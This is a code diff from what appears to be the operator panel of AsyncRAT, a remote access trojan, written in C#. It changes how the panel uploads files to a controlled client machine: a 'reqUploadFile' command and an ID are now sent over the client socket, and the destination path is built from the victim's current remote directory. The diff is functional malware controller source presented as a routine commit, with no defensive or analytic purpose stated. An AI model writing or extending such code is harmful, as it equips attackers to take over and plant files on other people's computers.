@@ -93,7 +93,6 @@ namespace AsyncRAT_Sharp.Forms
                                     Text = "socketDownload:" + C.ID,
                                     F = F
                                 };
-                                SD.isDownload = true;
                                 SD.Show();
                             }
                         }));
@@ -106,7 +105,7 @@ namespace AsyncRAT_Sharp.Forms
             }
         }
 
-        private async void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
+        private void uPLOADToolStripMenuItem_Click(object sender, EventArgs e)
         {
             try
             {
@@ -114,27 +113,29 @@ namespace AsyncRAT_Sharp.Forms
                 O.Multiselect = true;
                 if (O.ShowDialog() == DialogResult.OK)
                 {
-                    foreach(string ofile in O.FileNames)
+                    foreach (string ofile in O.FileNames)
                     {
                         FormDownloadFile SD = (FormDownloadFile)Application.OpenForms["socketDownload:" + ""];
                         if (SD == null)
                         {
                             SD = new FormDownloadFile
                             {
-                                Name = "socketUpload:" + "",
+                                Name = "socketUpload:" + Guid.NewGuid().ToString(),
                                 Text = "socketUpload:" + C.ID,
                                 F = Program.form1,
                                 C = C
                             };
                             SD.dSize = new FileInfo(ofile).Length;
                             SD.labelfile.Text = Path.GetFileName(ofile);
+                            SD.fullFileName = ofile;
+                            SD.label1.Text = "Upload:";
+                            SD.clientFullFileName = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(ofile);
                             MsgPack msgpack = new MsgPack();
                             msgpack.ForcePathObject("Packet").AsString = "fileManager";
-                            msgpack.ForcePathObject("Command").AsString = "uploadFile";
-                            await msgpack.ForcePathObject("File").LoadFileAsBytes(ofile);
-                            msgpack.ForcePathObject("Name").AsString = toolStripStatusLabel1.Text + "\\" + Path.GetFileName(ofile);
+                            msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
+                            msgpack.ForcePathObject("ID").AsString = SD.Name;
                             SD.Show();
-                            ThreadPool.QueueUserWorkItem(SD.Send, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(C.BeginSend, msgpack.Encode2Bytes());
                         }
                     }
                 }
